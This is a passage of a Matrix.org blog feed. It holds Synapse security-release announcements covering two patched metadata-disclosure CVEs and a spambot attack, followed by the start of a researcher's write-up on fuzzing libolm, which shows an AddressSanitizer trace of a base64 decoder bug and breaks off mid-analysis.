		<content type="html">&lt;p&gt;Today we are releasing Synapse 1.41.1, a security update based on last week&#x27;s release of &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;08&#x2F;24&#x2F;synapse-1-41-0-released&quot;&gt;Synapse 1.41.0&lt;&#x2F;a&gt;. This release patches two moderate severity issues which could reveal metadata about private rooms:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;security&#x2F;advisories&#x2F;GHSA-3x4c-pq33-4w3q&quot;&gt;GHSA-3x4c-pq33-4w3q&lt;&#x2F;a&gt; &#x2F; CVE-2021-39164: Enumerating a private room&#x27;s list of members and their display names.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;If an unauthorized user both knows the Room ID of a private room &lt;em&gt;and&lt;&#x2F;em&gt; that room&#x27;s history visibility is set to &lt;code&gt;shared&lt;&#x2F;code&gt;, then they may be able to enumerate the room&#x27;s members, including their display names.&lt;&#x2F;p&gt;
&lt;p&gt;The unauthorized user must be on the same homeserver as a user who is a member of the target room.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;security&#x2F;advisories&#x2F;GHSA-jj53-8fmw-f2w2&quot;&gt;GHSA-jj53-8fmw-f2w2&lt;&#x2F;a&gt; &#x2F; CVE-2021-39163: Disclosing a private room&#x27;s name, avatar, topic, and number of members.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;If an unauthorized user knows the Room ID of a private room, then its name, avatar, topic, and number of members may be disclosed through Group &#x2F; Community features.&lt;&#x2F;p&gt;
&lt;p&gt;The unauthorized user must be on the same homeserver as a user who is a member of the target room, and their homeserver must allow non-administrators to create groups (&lt;code&gt;enable_group_creation&lt;&#x2F;code&gt; in the Synapse configuration; off by default).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Note that in both cases:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The private room&#x27;s Room ID must be known to the attacker.&lt;&#x2F;li&gt;
&lt;li&gt;Another user on the attacker&#x27;s homeserver must be a legitimate member of the target room.&lt;&#x2F;li&gt;
&lt;li&gt;The information disclosed is &lt;em&gt;already&lt;&#x2F;em&gt; present in the database and thus legitimately known to the administrators of homeservers participating in the target room.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We&#x27;d like to credit &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;0xkasper&quot;&gt;0xkasper&lt;&#x2F;a&gt; for discovering and responsibly disclosing these issues.&lt;&#x2F;p&gt;
&lt;p&gt;This release also fixes a small regression in 1.41.0 (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;10709&quot;&gt;#10709&lt;&#x2F;a&gt;) which broke compatibility with older Twisted versions when Synapse was a configured to send email.&lt;&#x2F;p&gt;
&lt;p&gt;Please update at your earliest convenience.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Security update: Synapse 1.37.1 released</title>
		<published>2021-06-30T00:00:00+00:00</published>
		<updated>2021-06-30T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2021/06/30/security-update-synapse-1-37-1-released/" type="text/html"/>
		<id>/blog/2021/06/30/security-update-synapse-1-37-1-released/</id>
		<content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Over the last few days we&#x27;ve seen a distributed spam attack across the public Matrix network, where large numbers of spambots have been registered across servers with open registration and then used to flood abusive traffic into rooms such as Matrix HQ.&lt;&#x2F;p&gt;
&lt;p&gt;The spam itself has been handled by &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;guides&#x2F;moderation#banning-servers&quot;&gt;temporarily banning the abused servers&lt;&#x2F;a&gt;. However, on Monday and Tuesday the volume of traffic triggered performance problems for the homeservers participating in targeted rooms (e.g. memory explosions, or very delayed federation).  This was due to a combination of factors, but one of the most important ones was Synapse issue &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;9490&quot;&gt;#9490&lt;&#x2F;a&gt;: that one busy room could cause head-of-line blocking, starving your server from processing events in other rooms, causing all traffic to fall behind.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;re happy to say that Synapse 1.37.1 &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;10272&quot;&gt;fixes this&lt;&#x2F;a&gt; and we now process inbound federation traffic asynchronously, ensuring that one busy room won&#x27;t impact others.  First impressions are that this has significantly improved federation performance and end-to-end encryption stability — for instance, new E2EE keys from remote users for a given conversation should arrive immediately rather than being blocked behind other traffic.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Please upgrade to Synapse 1.37.1 as soon as possible, in order to increase resilience to any other traffic spikes.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Also, we highly recommend that you disable open registration or, if you keep it enabled, use SSO or require email validation to avoid abusive signups. Empirically adding a CAPTCHA is not enough. Otherwise you may find your server blocked all over the place if it is hosting spambots.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Finally, if your server has open registration, PLEASE check whether spambots have been registered on your server, and deactivate them.  Once deactivated, you will need to contact abuse@matrix.org to request that blocks on your server are removed&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Your best bet for spotting and neutralising dormant spambots is to review signups on your homeserver over the past 3-5 days and deactivate suspicious users. We do not recommend relying solely on lists of suspicious IP addresses for this task, as the distributed nature of the attack means any such list is likely to be incomplete or include shared proxies which may also catch legitimate users.&lt;&#x2F;p&gt;
&lt;p&gt;To ease review, we&#x27;re working on an auditing script in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;10290&quot;&gt;#10290&lt;&#x2F;a&gt;; feedback on whether this is useful would be appreciated. Problematic accounts can then be dealt with using the &lt;a href=&quot;https:&#x2F;&#x2F;matrix-org.github.io&#x2F;synapse&#x2F;v1.37&#x2F;admin_api&#x2F;user_admin_api.html#deactivate-account&quot;&gt;Deactivate Account Admin API&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, over to Dan for the Synapse 1.37 release notes.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;synapse-1-37-release-announcement&quot;&gt;Synapse 1.37 Release Announcement&lt;&#x2F;h2&gt;
&lt;p&gt;Synapse 1.37 is now available!&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;**Note: ** The legacy APIs for Spam Checker extension modules are now considered deprecated and targeted for removal in August. Please see &lt;a href=&quot;https:&#x2F;&#x2F;matrix-org.github.io&#x2F;synapse&#x2F;v1.37&#x2F;modules.html#porting-an-existing-module-that-uses-the-old-interface&quot;&gt;the module docs&lt;&#x2F;a&gt; for information on updating.&lt;&#x2F;p&gt;
&lt;p&gt;This release also removes Synapse&#x27;s built-in support for the obsolete ACMEv1 protocol for automatically obtaining TLS certificates. Server administrators should place Synapse behind a &lt;a href=&quot;https:&#x2F;&#x2F;matrix-org.github.io&#x2F;synapse&#x2F;v1.37&#x2F;reverse_proxy.html&quot;&gt;reverse proxy&lt;&#x2F;a&gt; for TLS termination, or switch to a standalone ACMEv2 client like &lt;a href=&quot;https:&#x2F;&#x2F;certbot.eff.org&#x2F;&quot;&gt;certbot&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h3 id=&quot;knock-knock&quot;&gt;Knock, knock?&lt;&#x2F;h3&gt;
&lt;p&gt;After nearly 18 months and 129 commits, Synapse now includes support for &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2403&quot;&gt;MSC2403: Add &amp;quot;knock&amp;quot; feature&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;spec.matrix.org&#x2F;unstable&#x2F;rooms&#x2F;v7&#x2F;&quot;&gt;Room Version 7&lt;&#x2F;a&gt;! This feature allows users to directly request admittance to private rooms, without having to track down an invitation out-of-band. One caveat: Though the server-side foundation is there, knocking is not &lt;em&gt;yet&lt;&#x2F;em&gt; implemented in clients.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;a-unified-interface-for-extension-modules&quot;&gt;A Unified Interface for Extension Modules&lt;&#x2F;h3&gt;
&lt;p&gt;Third party modules can customize Synapse&#x27;s behavior, implementing things like bespoke media storage providers or user event filters. However, Synapse previously lacked a unified means of enumerating and configuring third-party modules. That changes with Synapse 1.37, which introduces a new, &lt;a href=&quot;https:&#x2F;&#x2F;matrix-org.github.io&#x2F;synapse&#x2F;v1.37&#x2F;modules.html&quot;&gt;generic interface for extensions&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;This new interface consolidates configuration into one place, allowing for more flexibility and granularity by explicitly registering callbacks with specific hooks. You can learn more about the new module API in the docs linked above, or in &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;playlist?list=PLl5dnxRMP1hULbP8MYk2noPKFCFyg-SHK&quot;&gt;Matrix Live&lt;&#x2F;a&gt; S6E29, due out this Friday, July 2nd.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;safer-reauthentication&quot;&gt;Safer Reauthentication&lt;&#x2F;h3&gt;
&lt;p&gt;User-interactive authentication (&amp;quot;UIA&amp;quot;) is required for potentially dangerous actions like removing devices or uploading cross-signing keys. However, Synapse can optionally be configured to provide a brief grace period such that users are not prompted to re-authenticate on actions taken shortly after logging in or otherwise authenticating.&lt;&#x2F;p&gt;
&lt;p&gt;This improves user experience, but also creates risks for clients which rely on UIA as a guard against actions like account deactivation. Synapse 1.37 protects users by exempting especially risky actions from the grace period. See &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;10184&quot;&gt;#10184&lt;&#x2F;a&gt; for details.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;smaller-improvements&quot;&gt;Smaller Improvements&lt;&#x2F;h3&gt;
&lt;p&gt;We&#x27;ve landed a number of smaller improvements which, together, make Synapse more responsive and reliable. We now:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;More efficiently respond to key requests, preventing excessive load (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;10221&quot;&gt;#10221&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;10144&quot;&gt;#10144&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Render docs for each &lt;code&gt;vX.Y&lt;&#x2F;code&gt; Synapse release, starting with v1.37 (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;10198&quot;&gt;#10198&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Ensure that log entries from failures during early startup are not lost (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;10191&quot;&gt;#10191&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Have a notion of database schema &amp;quot;compatibility versions&amp;quot;, allowing for more graceful upgrades and downgrades of Synapse (&lt;a href=&quot;https:&#x2F;&#x2F;matrix-org.github.io&#x2F;synapse&#x2F;v1.37&#x2F;development&#x2F;database_schema.html#synapse-schema-versions&quot;&gt;docs&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We&#x27;ve also resolved two bugs which could cause sync requests to immediately return with empty payloads (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;8518&quot;&gt;#8518&lt;&#x2F;a&gt;), producing a tight loop of repeated network requests.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;everything-else&quot;&gt;Everything Else&lt;&#x2F;h3&gt;
&lt;p&gt;Lastly, we&#x27;ve merged an experimental implementation of &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2716&quot;&gt;MSC2716: Incrementally importing history into existing rooms&lt;&#x2F;a&gt; (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;9247&quot;&gt;#9247&lt;&#x2F;a&gt;) as part of Element&#x27;s work to fully &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;09&#x2F;30&#x2F;welcoming-gitter-to-matrix&quot;&gt;integrate Gitter into Matrix&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;These are just the highlights; please see the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;v1.37.1&#x2F;UPGRADE.rst#upgrading-to-v1370&quot;&gt;Upgrade Information&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;v1.37.1&#x2F;CHANGES.md&quot;&gt;Release Notes&lt;&#x2F;a&gt; for a complete list of changes in this release.&lt;&#x2F;p&gt;
&lt;p&gt;Synapse is a Free and Open Source Software project, and we&#x27;d like to extend our thanks to everyone who contributed to this release, including &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;aaronraimist&quot;&gt;aaronraimist&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Bubu&quot;&gt;Bubu&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;dklimpel&quot;&gt;dklimpel&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;jkanefendt&quot;&gt;jkanefendt&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;lukaslihotzki&quot;&gt;lukaslihotzki&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;mikure&quot;&gt;mikure&lt;&#x2F;a&gt;, and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Sorunome&quot;&gt;Sorunome&lt;&#x2F;a&gt;,&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Adventures in fuzzing libolm</title>
		<published>2021-06-14T00:00:00+00:00</published>
		<updated>2021-06-14T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2021/06/14/adventures-in-fuzzing-libolm/" type="text/html"/>
		<id>/blog/2021/06/14/adventures-in-fuzzing-libolm/</id>
		<content type="html">&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;&#x2F;h2&gt;
&lt;p&gt;Hi all! My name is Denis and I&#x27;m a &lt;a href=&quot;https:&#x2F;&#x2F;dkasak.github.io&#x2F;&quot;&gt;security
researcher&lt;&#x2F;a&gt;. Six months ago, I started working for
Element on doing dedicated security research on important Matrix projects.
After some initial focus on Synapse, I decided to take a closer look at
&lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;olm&quot;&gt;libolm&lt;&#x2F;a&gt;. In this entry, I&#x27;d like to
present an overview of that work, along with some early fruits that came out of
it.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;TL;DR: we found some bugs which had crept in since libolm&#x27;s original audit in
2016, thanks to properly overhauling our fuzzing capability, and we&#x27;d like to
tell you all about it! The bugs were not easily exploitable (if at all), and
have already been fixed.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Update:
&lt;a href=&quot;https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2021-34813&quot;&gt;CVE-2021-34813&lt;&#x2F;a&gt;
has now been assigned to this.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;To give a bit of a background, libolm is a cryptographic library implementing
the &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Double_Ratchet_Algorithm&quot;&gt;Double Ratchet
Algorithm&lt;&#x2F;a&gt; pioneered by
Signal and it is the cryptographic workhorse behind Matrix. The classic
algorithm is called Olm in Matrix land, but libolm also implements Megolm which
is a variant for efficient encrypted group chats between many participants.&lt;&#x2F;p&gt;
&lt;p&gt;Since libolm is currently used in all Matrix clients supporting end-to-end
encryption, it makes for a particularly juicy target. The present state of
libolm&#x27;s monopoly on Matrix encryption is somewhat unfortunate -- luckily there
are some exciting new developments on the horizon, such as the
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&#x2F;tree&#x2F;vodozemac-bench&quot;&gt;vodozemac&lt;&#x2F;a&gt;
implementation in Rust. But for now, we&#x27;re stuck with libolm.&lt;&#x2F;p&gt;
&lt;p&gt;To start, I decided to do a bit of fuzzing. libolm already had a fuzzing setup
using AFL, but it was written a while ago. The state of the art in fuzzing had
advanced quite rapidly in the last few years, so the setup was missing many
modern features and techniques. As an example, the fuzzing setup was configured
to use the now ancient afl-gcc coverage mode, which can be slower than the more
modern LLVM-based coverage by a factor of 2.&lt;&#x2F;p&gt;
&lt;p&gt;I also noticed that the fuzzing was done with non-hardened binaries (instead of
using something like ASAN), so many memory errors could&#x27;ve gone unnoticed.
There were also no corpora available from previous fuzzing runs and some of the
newer code was not covered by the harnesses.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;preparation&quot;&gt;Preparation&lt;&#x2F;h2&gt;
&lt;p&gt;I decided to tackle these one by one, adding ASAN and MSAN builds as a first
step. I took the opportunity to switch to &lt;a href=&quot;https:&#x2F;&#x2F;aflplus.plus&#x2F;&quot;&gt;AFL++&lt;&#x2F;a&gt; since
it is a drop-in replacement and contains numerous improvements, notably
improved coverage modes which are either much faster (e.g. LLVM-PCGUARD) or
guaranteed to have no collisions (LTO)&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#1&quot;&gt;1&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;. AFL++ also optimizes mutation
scheduling (by using scheduling algorithms from
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;mboehme&#x2F;aflfast&quot;&gt;AFLFast&lt;&#x2F;a&gt;) and mutation operator selection
(through &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;puppet-meteor&#x2F;MOpt-AFL&quot;&gt;MOpt&lt;&#x2F;a&gt;). All of this makes
it much more efficient at discovering bugs.&lt;&#x2F;p&gt;
&lt;p&gt;After this, I changed the existing harnesses to use AFL&#x27;s persistent mode
(which lowers process creation overhead and thus increases fuzzing
performance). This change, combined with the switch to a newer coverage mode,
increased the fuzzing exec&#x2F;s from ~2.5k to ~5.5k on my machine, so this is not
an insignificant gain!&lt;&#x2F;p&gt;
&lt;div class=&quot;footnote-definition&quot; id=&quot;1&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;1&lt;&#x2F;sup&gt;
&lt;p&gt;In the context of fuzzing, collisions are situations where
two different execution paths appear to the fuzzer as the same one due to
technical limitations.
Classically, AFL tracks coverage by tracking so-called &amp;quot;edges&amp;quot; (or &amp;quot;tuples&amp;quot;).
Edges are really pairs of (A, B), where A and B represent basic blocks. Each
edge is meant to represent a different execution &amp;quot;jump&amp;quot;, but sometimes, as
the number of basic blocks in a program grows, two different execution paths
can end up being encoded as the same edge. LTO mode in AFL++ does some magic
so that this is guaranteed not to happen.&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
&lt;p&gt;After this preparatory work, I generated a small initial corpus and ran a small
fleet of fuzzers with varying parameters. Almost immediately, I started getting
heaps of crashes. Luckily, after some investigation, these turned out not to be
serious bugs in the library but a double-free in the fuzzing harness! The
double-free only got triggered when the input was of size 0. It also only
happened with AFL++ and not vanilla AFL, presumably due to differences in input
trimming logic, which must be the reason no one noticed this earlier. I quickly
came up with a patch and resumed.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;the-plot-thickens&quot;&gt;The plot thickens&lt;&#x2F;h2&gt;
&lt;p&gt;I let the fuzzers run for a while. Since ASAN introduces a bit of a performance
overhead, I only run a single AFL instance with ASAN variant of the binary.
This is okay because all fuzzer instances actually synchronize their findings,
which means every instance gets to see every input which increases coverage.
When I came back to check, there was another crash waiting. This time the
crashing input wasn&#x27;t being generated continually so it looked much more
promising -- and only the ASAN instance was crashing. &lt;em&gt;A-ha&lt;&#x2F;em&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;Running the offending input on the ASAN variant of the harness revealed it was
an invalid read one byte past the end of a heap buffer. The read was happening
in the base64 decoder:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot;&gt;&lt;code&gt;&lt;span&gt;❮ .&#x2F;build&#x2F;fuzzers&#x2F;fuzz_group_decrypt_asan &amp;quot;&amp;quot; pickled-inbound-group-session.txt &amp;lt;input
&lt;&#x2F;span&gt;&lt;span&gt;=================================================================
&lt;&#x2F;span&gt;&lt;span&gt;==1838065==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf4a00795 at pc 0x56560660 bp 0xffff9df8 sp 0xffff9de8
&lt;&#x2F;span&gt;&lt;span&gt;READ of size 1 at 0xf4a00795 thread T0
&lt;&#x2F;span&gt;&lt;span&gt;    #0 0x5656065f in olm::decode_base64(unsigned char const*, unsigned int, unsigned char*) src&#x2F;base64.cpp:124
&lt;&#x2F;span&gt;&lt;span&gt;    #1 0x565607b5 in _olm_decode_base64 src&#x2F;base64.cpp:165
&lt;&#x2F;span&gt;&lt;span&gt;    #2 0x565d5a9e in olm_group_decrypt_max_plaintext_length src&#x2F;inbound_group_session.c:304
&lt;&#x2F;span&gt;&lt;span&gt;    #3 0x56558e75 in main fuzzers&#x2F;fuzz_group_decrypt.cpp:46
&lt;&#x2F;span&gt;&lt;span&gt;    #4 0xf7509a0c in __libc_start_main (&#x2F;usr&#x2F;lib32&#x2F;libc.so.6+0x1ea0c)
&lt;&#x2F;span&gt;&lt;span&gt;    #5 0x5655a0f4 in _start (&#x2F;home&#x2F;dkasak&#x2F;code&#x2F;olm&#x2F;build&#x2F;fuzzers&#x2F;fuzz_group_decrypt_asan+0x50f4)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;0xf4a00795 is located 0 bytes to the right of 5-byte region [0xf4a00790,0xf4a00795)
&lt;&#x2F;span&gt;&lt;span&gt;allocated by thread T0 here:
&lt;&#x2F;span&gt;&lt;span&gt;    #0 0xf7a985c5 in __interceptor_malloc &#x2F;build&#x2F;gcc&#x2F;src&#x2F;gcc&#x2F;libsanitizer&#x2F;asan&#x2F;asan_malloc_linux.cpp:145
&lt;&#x2F;span&gt;&lt;span&gt;    #1 0x56558ce3 in main fuzzers&#x2F;fuzz_group_decrypt.cpp:32
&lt;&#x2F;span&gt;&lt;span&gt;    #2 0xf7509a0c in __libc_start_main (&#x2F;usr&#x2F;lib32&#x2F;libc.so.6+0x1ea0c)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;SUMMARY: AddressSanitizer: heap-buffer-overflow src&#x2F;base64.cpp:124 in olm::decode_base64(unsigned char const*, unsigned int, unsigned char*)
&lt;&#x2F;span&gt;&lt;span&gt;Shadow bytes around the buggy address:
&lt;&#x2F;span&gt;&lt;span&gt;  0x3e9400a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
&lt;&#x2F;span&gt;&lt;span&gt;  0x3e9400b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
&lt;&#x2F;span&gt;&lt;span&gt;  0x3e9400c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
&lt;&#x2F;span&gt;&lt;span&gt;  0x3e9400d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
&lt;&#x2F;span&gt;&lt;span&gt;  0x3e9400e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
&lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt;0x3e9400f0: fa fa[05]fa fa fa 05 fa fa fa fa fa fa fa fa fa
&lt;&#x2F;span&gt;&lt;span&gt;  0x3e940100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
&lt;&#x2F;span&gt;&lt;span&gt;  0x3e940110: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
&lt;&#x2F;span&gt;&lt;span&gt;  0x3e940120: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
&lt;&#x2F;span&gt;&lt;span&gt;  0x3e940130: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
&lt;&#x2F;span&gt;&lt;span&gt;  0x3e940140: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
&lt;&#x2F;span&gt;&lt;span&gt;Shadow byte legend (one shadow byte represents 8 application bytes):
&lt;&#x2F;span&gt;&lt;span&gt;  Addressable:           00
&lt;&#x2F;span&gt;&lt;span&gt;  Partially addressable: 01 02 03 04 05 06 07 
&lt;&#x2F;span&gt;&lt;span&gt;  Heap left redzone:       fa
&lt;&#x2F;span&gt;&lt;span&gt;  Freed heap region:       fd
&lt;&#x2F;span&gt;&lt;span&gt;  Stack left redzone:      f1
&lt;&#x2F;span&gt;&lt;span&gt;  Stack mid redzone:       f2
&lt;&#x2F;span&gt;&lt;span&gt;  Stack right redzone:     f3
&lt;&#x2F;span&gt;&lt;span&gt;  Stack after return:      f5
&lt;&#x2F;span&gt;&lt;span&gt;  Stack use after scope:   f8
&lt;&#x2F;span&gt;&lt;span&gt;  Global redzone:          f9
&lt;&#x2F;span&gt;&lt;span&gt;  Global init order:       f6
&lt;&#x2F;span&gt;&lt;span&gt;  Poisoned by user:        f7
&lt;&#x2F;span&gt;&lt;span&gt;  Container overflow:      fc
&lt;&#x2F;span&gt;&lt;span&gt;  Array cookie:            ac
&lt;&#x2F;span&gt;&lt;span&gt;  Intra object redzone:    bb
&lt;&#x2F;span&gt;&lt;span&gt;  ASan internal:           fe
&lt;&#x2F;span&gt;&lt;span&gt;  Left alloca redzone:     ca
&lt;&#x2F;span&gt;&lt;span&gt;  Right alloca redzone:    cb
&lt;&#x2F;span&gt;&lt;span&gt;  Shadow gap:              cc
&lt;&#x2F;span&gt;&lt;span&gt;==1838065==ABORTING
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Following the stack trace, I quickly pinpointed the root of the bug: the logic
of the decoder was subtly flawed, unconditionally accessing a remainder
byte&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#2&quot;&gt;2&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; in the base64 input which might not actually be there.
This occurs when the input is 1 (mod 4) in length, which can never happen in
a &lt;em&gt;valid&lt;&#x2F;em&gt; base64 payload, but of course we cannot assume all inputs are
necessarily valid payloads. Specifically, if the payload was not 0 (mod 4) in
length, the code was assuming it was at least 2 (mod 4) or more in length and
immediately read the second byte. This spurious byte was then incorporated into
the output value.&lt;&#x2F;p&gt;
&lt;div class=&quot;footnote-definition&quot; id=&quot;2&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;2&lt;&#x2F;sup&gt;
&lt;p&gt;By &lt;em&gt;remainder byte&lt;&#x2F;em&gt;, I mean bytes which are not part of
a group of 4. These can only occur at the end of a base64 payload and they&#x27;re
the ones that get suffixed with padding in padded base64.&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
&lt;p&gt;I examined the code in an attempt to find a way to have it leak more than
a single byte, but it was impossible. As it turned out, not even the full byte
of useful information was encoded into the output -- due to the way the byte is
encoded, only about 6 bits of useful information ended up in the output value.&lt;&#x2F;p&gt;
&lt;p&gt;Still, even a single leaked bit is too much in a cryptographic context. Could
we do some heap hacking so that something of interest is placed there and then
have it be leaked to us?&lt;&#x2F;p&gt;
&lt;p&gt;I next tracked down all call sites of the vulnerable function
&lt;code&gt;olm::decode_base64&lt;&#x2F;code&gt;. Most of them were immune to the problem since they were
preceded with calls to another function, &lt;code&gt;olm::decode_base64_length&lt;&#x2F;code&gt;, which
checks that the base64 payload is of legal length. This left me with only a few
potentially vulnerable call sites, so I examined where their base64 inputs come
from. Promisingly, two of them received input from other conversation
participants, but they either had no way of leaking the information back to the
attacker or they hardcoded the number of bytes to be processed, after ensuring
the input was of some minimum length. The output of the remaining function
&lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;olm&#x2F;-&#x2F;blob&#x2F;0a7b6da9a0959694303d5b0724a09e63e8c217ab&#x2F;src&#x2F;pk.cpp#L352&quot;&gt;&lt;code&gt;olm_pk_decrypt&lt;&#x2F;code&gt;&lt;&#x2F;a&gt; is never sent anywhere externally, so there
